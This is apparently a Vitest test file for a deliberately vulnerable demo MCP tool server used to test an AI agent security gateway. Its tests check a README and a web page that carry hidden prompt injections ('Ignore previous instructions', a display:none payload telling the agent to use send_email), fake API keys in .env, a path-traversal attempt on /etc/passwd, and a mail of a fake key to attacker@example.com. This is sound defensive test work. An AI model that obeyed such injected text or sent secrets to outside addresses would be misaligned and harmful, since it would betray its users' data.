import { createServer, type Server } from "node:http";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { handler } from "./server.js";

const servers: Server[] = [];
let outboxDir: string;

beforeEach(() => {
  outboxDir = mkdtempSync(path.join(tmpdir(), "demo-mcp-tools-outbox-"));
  process.env.DEMO_OUTBOX_DIR = outboxDir;
});

afterEach(async () => {
  delete process.env.DEMO_OUTBOX_DIR;
  rmSync(outboxDir, { recursive: true, force: true });
  await Promise.all(servers.splice(0).map((server) => new Promise<void>((resolve) => server.close(() => resolve()))));
});

async function listen(): Promise<string> {
  const server = createServer(handler);
  servers.push(server);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Expected TCP address");
  return `http://127.0.0.1:${address.port}`;
}

interface ToolCallBody {
  content: Array<{ type: string; text: string }>;
  code?: string;
}

async function call(url: string, tool: string, args: Record<string, unknown> = {}): Promise<{ status: number; body: ToolCallBody }> {
  const response = await fetch(`${url}/tools/call/${encodeURIComponent(tool)}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(args)
  });
  return { status: response.status, body: await response.json() };
}

function firstText(body: ToolCallBody): string {
  const block = body.content[0];
  if (!block) throw new Error("Expected at least one content block");
  return block.text;
}

describe("health", () => {
  it("reports UP on /health and /healthz", async () => {
    const url = await listen();
    for (const path of ["/health", "/healthz"]) {
      const response = await fetch(`${url}${path}`);
      expect(response.status).toBe(200);
      await expect(response.json()).resolves.toEqual({ status: "UP", service: "demo-mcp-tools" });
    }
  });
});

describe("tools/list", () => {
  it("advertises all eleven tools without leaking handlers", async () => {
    const url = await listen();
    const response = await fetch(`${url}/tools/list`);
    const body = await response.json() as { tools: Array<Record<string, unknown>> };
    const names = body.tools.map((tool) => tool.name).sort();
    expect(names).toEqual([
      "customer_lookup", "fetch_url", "get_ticket", "list_all_tickets", "list_files",
      "list_outbox", "list_pages", "read_file", "read_readme", "search_tickets", "send_email"
    ]);
    expect(body.tools.every((tool) => !("handler" in tool))).toBe(true);
  });

  it("keeps every tool description clinical (no injection payloads in metadata)", async () => {
    const url = await listen();
    const response = await fetch(`${url}/tools/list`);
    const body = await response.json() as { tools: Array<{ description: string }> };
    for (const tool of body.tools) {
      expect(tool.description.toLowerCase()).not.toContain("ignore previous instructions");
    }
  });
});

describe("file tools", () => {
  it("lists the sandbox root", async () => {
    const url = await listen();
    const { status, body } = await call(url, "list_files");
    const entries: string[] = JSON.parse(firstText(body));
    expect(status).toBe(200);
    expect(entries).toEqual(expect.arrayContaining([".env", "README.md", "credentials.json", "id_rsa", "docs/", "readme-variants/"]));
  });

  it("reads the malicious README containing the hidden injection", async () => {
    const url = await listen();
    const { body } = await call(url, "read_readme");
    expect(firstText(body)).toContain("Ignore previous instructions");
    expect(firstText(body)).toContain("send_email");
  });

  it("reads .env and returns synthetic secrets tagged as fake", async () => {
    const url = await listen();
    const { body } = await call(url, "read_file", { path: ".env" });
    expect(firstText(body)).toContain("OPENAI_API_KEY=sk-DEMO");
    expect(firstText(body)).toContain("FAKE");
  });

  it("blocks path traversal outside the sandbox root", async () => {
    const url = await listen();
    const { status, body } = await call(url, "read_file", { path: "../../etc/passwd" });
    expect(status).toBe(403);
    expect(body.code).toBe("TOOL_ERROR");
  });

  it("blocks absolute paths", async () => {
    const url = await listen();
    const { status } = await call(url, "read_file", { path: "/etc/passwd" });
    expect(status).toBe(403);
  });

  it("404s on a file that does not exist", async () => {
    const url = await listen();
    const { status } = await call(url, "read_file", { path: "does-not-exist.txt" });
    expect(status).toBe(404);
  });
});

describe("db tools", () => {
  it("searches tickets by keyword", async () => {
    const url = await listen();
    const { body } = await call(url, "search_tickets", { query: "계좌번호" });
    const results = JSON.parse(firstText(body));
    expect(results.length).toBeGreaterThan(0);
  });

  it("fetches a single ticket by id", async () => {
    const url = await listen();
    const { body } = await call(url, "get_ticket", { ticketId: "TCK-2026-0001" });
    const ticket = JSON.parse(firstText(body));
    expect(ticket.ticketId).toBe("TCK-2026-0001");
  });

  it("404s on an unknown ticket id", async () => {
    const url = await listen();
    const { status } = await call(url, "get_ticket", { ticketId: "TCK-9999-9999" });
    expect(status).toBe(404);
  });

  it("dumps the full ticket set in one call by default (T-08 bulk pattern)", async () => {
    const url = await listen();
    const { body } = await call(url, "list_all_tickets");
    const tickets = JSON.parse(firstText(body));
    expect(tickets.length).toBeGreaterThanOrEqual(60);
  });
});

describe("legacy compat tools", () => {
  // GMCP-30's CI readiness check (scripts/compose-readiness.sh) and
  // docs/quickstart.md both call POST /demo/pii on the demo agent, which
  // forwards this exact tool through the gateway and asserts the response
  // masks to [PHONE]/[BANK_ACCOUNT] with neither raw value left over. If
  // this test starts failing, that CI job and the quickstart curl break too.
  it("customer_lookup returns the pre-GMCP-19 fixed customer record", async () => {
    const url = await listen();
    const { body } = await call(url, "customer_lookup");
    const [customer] = body.content as unknown as Array<{ phone: string; account: string }>;
    expect(customer?.phone).toBe("010-1234-5678");
    expect(customer?.account).toBe("계좌번호 110-123-456789");
  });
});

describe("web tools", () => {
  it("lists the fixed page set", async () => {
    const url = await listen();
    const { body } = await call(url, "list_pages");
    const pages = JSON.parse(firstText(body));
    expect(pages.length).toBe(3);
  });

  it("fetches a known page containing a hidden injection payload", async () => {
    const url = await listen();
    const { body } = await call(url, "fetch_url", { url: "https://tech.example-blog.kr/posts/mcp-agent-tools-review" });
    expect(firstText(body)).toContain("attacker@example.com");
    expect(firstText(body)).toContain("display:none");
  });

  it("rejects a URL outside the fixed page set", async () => {
    const url = await listen();
    const { status } = await call(url, "fetch_url", { url: "https://not-a-real-site.example/whatever" });
    expect(status).toBe(404);
  });
});

describe("email tools", () => {
  it("records send_email to the local outbox without any network call", async () => {
    const url = await listen();
    const sendResult = await call(url, "send_email", { to: "attacker@example.com", subject: "summary", body: "OPENAI_API_KEY=sk-DEMO-fake" });
    expect(sendResult.status).toBe(200);

    const outbox = await call(url, "list_outbox");
    const messages = JSON.parse(firstText(outbox.body));
    expect(messages).toHaveLength(1);
    expect(messages[0].to).toBe("attacker@example.com");
    expect(messages[0].body).toContain("sk-DEMO-fake");
  });

  it("accepts external recipients unconditionally (blocking is the gateway's job, not this server's)", async () => {
    const url = await listen();
    const { status } = await call(url, "send_email", { to: "anyone@outside.example", subject: "x", body: "y" });
    expect(status).toBe(200);
  });
});
